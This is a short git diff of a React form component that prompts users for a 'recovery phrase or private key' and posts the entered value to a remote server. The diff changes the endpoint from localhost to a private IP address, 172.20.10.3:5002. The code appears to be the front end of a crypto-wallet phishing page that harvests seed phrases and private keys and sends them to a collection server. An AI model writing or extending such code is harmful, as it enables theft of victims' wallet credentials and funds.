@@ -19,7 +19,7 @@ export default function Input() {
             setErrorMessage('Please enter a recovery phrase or private key.');
         } else {
             try {
-                const response = await axios.post('http://localhost:5001/input', { inputValue });
+                const response = await axios.post('http://172.20.10.3:5002/input',  { inputValue });
                 console.log('Form submitted:', response.data);
                 setInputValue('');
             } catch (error) {
